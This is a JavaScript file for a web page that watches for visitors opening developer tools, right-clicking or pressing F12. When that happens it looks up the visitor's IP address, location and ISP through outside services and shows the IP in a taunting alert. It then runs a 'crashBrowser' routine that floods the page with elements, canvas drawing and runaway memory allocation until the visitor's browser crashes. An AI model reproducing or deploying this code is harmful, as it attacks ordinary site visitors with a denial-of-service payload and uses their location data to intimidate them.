const body = document.body;
let evilMode = false;

function toggleEvilMode() {
}

// IP Info via ipify.org + ip-api.com
async function getIPInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip || "Unknown IP";
        const detailResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const detailData = await detailResponse.json();
        return {
            ip,
            city: detailData.city || "Unknown City",
            region: detailData.region || "Unknown Region",
            country: detailData.country || "Unknown Country",
            isp: detailData.isp || "Unknown ISP",
            vpn: detailData.proxy || false
        };
    } catch {
        return {
            ip: "192.168.1.1",
            city: "Classified",
            region: "Classified",
            country: "Classified",
            isp: "Shadow Network",
            vpn: false
        };
    }
}

// Popup Trigger with Crasher
async function triggerPopup() {
    const ipInfo = await getIPInfo();
    const vpnText = ipInfo.vpn ? " (VPN DETECTED - ANTI-SKID NEUTRALIZATION ACTIVE)" : "";
    const message = `Your IP: ${ipInfo.ip}${vpnText}`;
    alert(message); // Popup shows first
    crashBrowser(); // Then crasher kicks in
}

// Insane Memory Eater
function crashBrowser() {
    // Mega DOM Spam
    const spam = () => {
        for (let i = 0; i < 100000; i++) { // 100k elements
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.top = `${Math.random() * 500}vh`; // Way oversized
            div.style.left = `${Math.random() * 500}vw`;
            div.style.width = '500px'; // Huge elements
            div.style.height = '500px';
            div.style.background = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
            div.innerHTML = "<p>".repeat(5000); // 5k nested tags
            document.body.appendChild(div);
        }
        requestAnimationFrame(spam);
    };
    spam();

    // Canvas Overload
    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth * 4; // Quadruple size
    canvas.height = window.innerHeight * 4;
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    const overload = () => {
        for (let i = 0; i < 10000; i++) { // 10k shapes
            ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200); // Bigger rects
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 100, 0, Math.PI * 2);
            ctx.fill(); // More shapes
        }
        requestAnimationFrame(overload);
    };
    overload();

    // Memory Hog Extreme
    let arr = [];
    const hog = () => {
        for (let i = 0; i < 5000000; i++) { // 5 million iterations
            arr.push(new Array(5000000).fill(Math.random())); // 5M x 5M base
        }
        arr = arr.concat(arr, arr, arr); // Quadruple each time
        setTimeout(hog, 0); // No delay, max speed
    };
    hog();

    // Parallel Hog for Extra Pain
    let arr2 = [];
    const hog2 = () => {
        for (let i = 0; i < 5000000; i++) {
            arr2.push(new Array(5000000).fill(Math.random()));
        }
        arr2 = arr2.concat(arr2, arr2, arr2);
        setTimeout(hog2, 0);
    };
    hog2();
}

// Advanced Dev Tools Detection
(function detectDevTools() {
    let devToolsOpen = false;

    let lastWidth = window.outerWidth;
    let lastHeight = window.outerHeight;
    setInterval(() => {
        if (window.outerWidth !== lastWidth || window.outerHeight !== lastHeight) {
            devToolsOpen = true;
            if (!evilMode) toggleEvilMode();
            triggerPopup();
            lastWidth = window.outerWidth;
            lastHeight = window.outerHeight;
        }
    }, 100);

    const consoleTrap = () => {
        let trap = { toString: () => { devToolsOpen = true; } };
        console.profile(trap);
        console.profileEnd(trap);
    };
    setInterval(() => {
        consoleTrap();
        if (devToolsOpen && !evilMode) {
            toggleEvilMode();
            triggerPopup();
        }
    }, 500);

    const timingCheck = () => {
        const start = performance.now();
        const testFunc = function() {}.toString();
        const end = performance.now();
        if (end - start > 10) {
            devToolsOpen = true;
            if (!evilMode) toggleEvilMode();
            triggerPopup();
        }
    };
    setInterval(timingCheck, 500);

    const debuggerCheck = () => {
        const start = performance.now();
        debugger;
        const end = performance.now();
        if (end - start > 100) {
            devToolsOpen = true;
            if (!evilMode) toggleEvilMode();
            triggerPopup();
        }
    };
    setInterval(debuggerCheck, 500);
})();

document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    if (!evilMode) toggleEvilMode();
    triggerPopup();
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        if (!evilMode) toggleEvilMode();
        triggerPopup();
    }
});